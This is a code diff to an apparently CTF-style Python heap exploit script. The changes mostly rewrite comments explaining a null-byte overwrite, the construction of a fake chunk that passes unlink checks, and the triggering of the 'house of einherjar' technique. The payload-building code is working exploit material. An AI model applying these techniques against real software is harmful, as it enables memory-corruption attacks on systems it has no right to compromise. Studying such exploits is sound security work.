@@ -102,9 +102,10 @@ delete()
 wipe()
 
 payload = b''
-payload += b'E' * 0xf8  # userland, after this chunk's size is overwritten to 0x100
-payload += p64(0x50 | 1)  # fake size, after this chunk's size is overwritten to 0x100
-alloc(0x148, payload)  # this chunk's size will later be overwritten to 0x100
+payload += b'E' * 0xf8  # userland
+payload += p64(0x50 | 1)  # fake size
+# this chunk's size will later be overwritten to 0x100 with `alloc(0x138, payload)`
+alloc(0x148, payload)
 delete()
 wipe()
 
@@ -117,20 +118,26 @@ fake_size = 0x20 + 0x120 + 0x130 + 0x140
 payload = b''
 payload += b'G' * 0x130
 payload += p64(fake_size)  # fake prev size
-alloc(0x138, payload)  # NULL Byte overwrite
+# NULL Byte overwrite.
+# since the following alloc will be allocated from tcache,
+# this will overwrite chunk allocated by `alloc(0x148, payload)`.
+# it will change the size from 0x151 to 0x100
+alloc(0x138, payload)
 wipe()
 
 addr_fake_chunk = addr_heap + 0xb90
 payload = b''
 payload += b'H' * 0xe8  # <- addr_fake_chunk point's here
 payload += p64(fake_size | 1)
-payload += p64(addr_fake_chunk)  # fd (to pass check in unlink_chunk, 
+payload += p64(addr_fake_chunk)  # fd (to pass check in unlink_chunk,
 payload += p64(addr_fake_chunk)  # bk     fd and bk has to point to itself)
 alloc(0x108, payload)  # write fake chunk header to the first chunk
 wipe()
 
 alloc(0x148, b'I')
-delete()  # house of einherjar
+# Since the size of chunk allocated by alloc(0x148, b'I') is overwritten from 0x151 to 0x100
+# this delete try to place the chunk into unsorted bins, in turn triggering house of einherjar.
+delete()
 wipe()
 
 alloc(0, b'')
